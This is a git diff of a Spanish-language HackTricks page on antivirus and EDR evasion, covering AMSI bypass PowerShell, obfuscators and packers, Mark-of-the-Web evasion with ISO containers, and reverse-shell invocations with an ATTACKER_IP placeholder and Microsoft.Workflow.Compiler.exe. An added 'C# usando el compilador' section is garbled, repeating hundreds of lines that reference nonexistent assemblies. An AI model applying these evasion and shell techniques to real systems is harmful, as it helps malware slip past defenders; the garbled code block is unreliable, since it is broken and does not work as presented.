@@ -122,7 +122,7 @@ Estos son los resultados:
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze es un conjunto de herramientas de carga útil para eludir los EDR mediante procesos suspendidos, llamadas al sistema directas y métodos de ejecución alternativos`
+`Freeze es un conjunto de herramientas de carga útil para eludir los EDR mediante procesos suspendidos, llamadas directas al sistema y métodos de ejecución alternativos`
 
 Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
 ```
@@ -139,7 +139,7 @@ La evasión es solo un juego del gato y el ratón, lo que funciona hoy podría s
 
 ## AMSI (Interfaz de Escaneo Anti-Malware)
 
-AMSI fue creado para prevenir el "malware sin archivo". Inicialmente, los antivirus solo podían escanear **archivos en el disco**, por lo que si de alguna manera pudieras ejecutar cargas útiles **directamente en la memoria**, el antivirus no podría hacer nada para evitarlo, ya que no tenía suficiente visibilidad.
+AMSI fue creado para prevenir el "malware sin archivo". Inicialmente, los antivirus solo podían escanear **archivos en disco**, por lo que si de alguna manera pudieras ejecutar cargas útiles **directamente en la memoria**, el antivirus no podría hacer nada para evitarlo, ya que no tenía suficiente visibilidad.
 
 La función AMSI está integrada en estos componentes de Windows.
 
@@ -165,7 +165,7 @@ Hay un par de formas de evitar AMSI:
 
 Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena manera de evadir la detección.
 
-Sin embargo, AMSI tiene la capacidad de desobfuscatear scripts incluso si tiene múltiples capas, por lo que la obfuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, por lo que depende de cuánto se haya marcado algo.
+Sin embargo, AMSI tiene la capacidad de desobfuscatear scripts incluso si tiene múltiples capas, por lo que la obfuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, por lo que depende de cuánto se haya marcado algo.
 
 * **Bypass de AMSI**
 
@@ -193,7 +193,7 @@ Try{#Ams1 bypass technic nº 2
       $Spotfix.SetValue($null,$true)
    }Catch{Throw $_}
 ```
-Ten en cuenta que esto probablemente será detectado una vez que se publique este post, por lo que no debes publicar ningún código si tu plan es mantenerse indetectable.
+Ten en cuenta que esto probablemente será detectado una vez que se publique esta publicación, por lo que no debes publicar ningún código si tu plan es permanecer indetectable.
 
 **Parcheo de memoria**
 
@@ -207,12 +207,12 @@ También hay muchas otras técnicas utilizadas para evitar AMSI con powershell, 
 
 ## Ofuscación
 
-Existen varias herramientas que se pueden utilizar para **ofuscar el código claro de C#**, generar **plantillas de metaprogramación** para compilar binarios u **ofuscar binarios compilados** como:
+Existen varias herramientas que se pueden utilizar para **ofuscar el código C# en texto claro**, generar **plantillas de metaprogramación** para compilar binarios u **ofuscar binarios compilados** como:
 
 * [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
 * [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar una mayor seguridad del software a través de la [ofuscación de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) y la protección contra manipulaciones.
 * [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo utilizar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin utilizar ninguna herramienta externa y sin modificar el compilador.
-* [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que hará la vida de la persona que quiera crackear la aplicación un poco más difícil.
+* [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas C++ que hará la vida de la persona que quiera crackear la aplicación un poco más difícil.
 * [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 que es capaz de ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
 * [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
 * [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes compatibles con LLVM que utilizan ROP (programación orientada a la devolución). ROPfuscator ofusca un programa a nivel de código de ensamblador transformando las instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
@@ -227,7 +227,7 @@ Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger
 
 <figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas de forma poco común activarán SmartScreen, lo que alertará y evitará que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).
+SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas de manera poco común activarán SmartScreen, lo que alertará y evitará que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).
 
 **MoTW** (Mark of The Web) es un [flujo de datos alternativo de NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de Internet, junto con la URL de la que se descargó.
 
@@ -237,9 +237,9 @@ SmartScreen funciona principalmente con un enfoque basado en la reputación, lo 
 Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** no activarán SmartScreen.
 {% endhint %}
 
-Una forma muy efectiva de evitar que tus cargas útiles obtengan la marca de la web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque la marca de la web (MOTW) **no se puede aplicar** a **volúmenes no NTFS**.
+Una forma muy efectiva de evitar que tus cargas útiles obtengan la marca de la web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque la marca de la web (MOTW) **no se puede aplicar** a **volúmenes que no sean NTFS**.
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta cargas útiles en contenedores de salida para evitar la marca de la web.
 
@@ -309,7 +309,7 @@ La evasión es un tema muy complicado, a veces tienes que tener en cuenta muchas
 
 Cada entorno contra el que te enfrentes tendrá sus propias fortalezas y debilidades.
 
-Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para tener una idea de las técnicas de evasión más avanzadas.
+Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener un punto de apoyo en técnicas de evasión más avanzadas.
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
@@ -418,13 +418,13 @@ El empaquetado es el proceso de comprimir y cifrar nuestro código para hacerlo 
 
 - **PyInstaller**: PyInstaller es una herramienta que puede empaquetar nuestro código en un archivo ejecutable independiente.
 
-- **cx_Freeze**: cx_Freeze es una herramienta similar a PyInstaller que puede empaquetar nuestro código en un archivo ejecutable independiente.
-
 - **UPX**: UPX es una herramienta que puede comprimir nuestro archivo ejecutable para hacerlo más pequeño y más difícil de entender para las herramientas de análisis.
+
+- **Cifrado**: podemos cifrar nuestro archivo ejecutable para hacerlo más difícil de entender para las herramientas de análisis.
 
 ## Conclusión
 
-La ofuscación y el empaquetado son técnicas efectivas para evadir la detección de AV. Sin embargo, es importante tener en cuenta que estas técnicas no son infalibles y que los AV están constantemente mejorando sus capacidades de detección. Por lo tanto, es importante utilizar estas técnicas junto con otras medidas de seguridad, como la firma de código y el cifrado de comunicaciones, para garantizar la seguridad de nuestro código.
+La ofuscación y el empaquetado son técnicas efectivas para evadir la detección de AV. Al utilizar estas técnicas, podemos hacer que nuestro código sea más difícil de entender para las herramientas de análisis y, por lo tanto, evadir la detección. Sin embargo, es importante tener en cuenta que estas técnicas no son infalibles y que los AV están constantemente mejorando su capacidad para detectar malware.
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -500,9 +500,270 @@ namespace ConnectBack
 	}
 }
 ```
-[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
+### C# usando el compilador
 
-### C# usando compilador
+En algunos casos, los antivirus pueden detectar el código malicioso en un archivo compilado. Para evitar esto, podemos usar el compilador de C# para compilar nuestro código en tiempo de ejecución. Esto se puede hacer utilizando la clase `CSharpCodeProvider` de la biblioteca `System.CodeDom.Compiler`. 
+
+Primero, necesitamos agregar una referencia a la biblioteca `System.CodeDom.Compiler`. Luego, podemos usar el siguiente código para compilar nuestro archivo C#:
+
+```csharp
+using System;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using Microsoft.CSharp;
+
+namespace Compiler
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var provider = new CSharpCodeProvider();
+            var parameters = new CompilerParameters();
+            parameters.GenerateExecutable = true;
+            parameters.OutputAssembly = "output.exe";
+            parameters.CompilerOptions = "/target:winexe";
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Core.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            parameters.ReferencedAssemblies.Add("System.Management.dll");
+            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
+            parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.dll");
+            parameters.ReferencedAssemblies.Add("System.Xml.dll");
+            parameters.ReferencedAssemblies.Add("System.Xml.Linq.dll");
+            parameters.ReferencedAssemblies.Add("System.Configuration.dll");
+            parameters.ReferencedAssemblies.Add("System.Security.dll");
+            parameters.ReferencedAssemblies.Add("System.Numerics.dll");
+            parameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.Web.dll");
+            parameters.ReferencedAssemblies.Add("System.IdentityModel.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.Activation.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.Discovery.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.Routing.dll");
+            parameters.ReferencedAssemblies.Add("System.Activities.dll");
+            parameters.ReferencedAssemblies.Add("System.Activities.Core.Presentation.dll");
+            parameters.ReferencedAssemblies.Add("System.Activities.Presentation.dll");
+            parameters.ReferencedAssemblies.Add("System.ServiceModel.Activities.dll");
+            parameters.ReferencedAssemblies.Add("System.WorkflowServices.dll");
+            parameters.ReferencedAssemblies.Add("System.DirectoryServices.dll");
+            parameters.ReferencedAssemblies.Add("System.DirectoryServices.AccountManagement.dll");
+            parameters.ReferencedAssemblies.Add("System.DirectoryServices.Protocols.dll");
+            parameters.ReferencedAssemblies.Add("System.EnterpriseServices.dll");
+            parameters.ReferencedAssemblies.Add("System.EnterpriseServices.Thunk.dll");
+            parameters.ReferencedAssemblies.Add("System.Transactions.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.OracleClient.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.SqlClient.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.SqlServerCe.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.SqlXml.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.Entity.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.Linq.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.Linq.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.Services.Client.dll");
+            parameters.ReferencedAssemblies.Add("System.Data.Services.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Abstractions.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.ApplicationServices.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.DynamicData.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.DynamicData.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Entity.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Entity.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Extensions.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Mobile.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.RegularExpressions.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Routing.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.Services.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Deployment.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Razor.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Administration.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Data.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Deployment.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Razor.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Administration.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Data.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebPages.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Web.WebSockets.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Input.Manipulations.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Presentation.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Controls.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Controls.Ribbon.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.DataVisualization.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Design.Editors.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Ribbon.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Ribbon.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Input.Manipulations.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Presentation.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Controls.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Controls.Ribbon.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.DataVisualization.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Design.Editors.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Ribbon.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.Ribbon.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Hosting.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.dll");
+            parameters.ReferencedAssemblies.Add("System.Xaml.Rx.Design.dll");
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
@@ -569,10 +830,10 @@ https://github.com/praetorian-code/vulcan
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
